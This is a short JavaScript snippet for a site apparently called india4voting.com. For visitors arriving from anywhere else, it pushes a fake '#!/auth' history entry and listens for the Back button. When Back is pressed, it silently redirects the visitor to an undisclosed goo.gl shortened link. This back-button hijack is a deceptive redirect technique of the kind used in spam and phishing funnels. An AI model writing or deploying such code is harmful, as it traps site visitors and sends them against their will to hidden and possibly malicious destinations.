var ref = document.referrer;
var siteurl = "http://india4voting.com/";//if you have www, then use www. http://www.yoursite.com
if (ref.indexOf(siteurl)!= -1){
}
else{
(function(window, location) {
    history.replaceState(null, document.title, location.pathname+"#!/auth");
    history.pushState(null, document.title, location.pathname);

    window.addEventListener("popstate", function() {
      if(location.hash === "#!/auth") {
        history.replaceState(null, document.title, location.pathname);
        setTimeout(function(){
          location.replace("https://goo.gl/qzRrmK");
        },0);
      }
    }, false);
}(window, location));
}
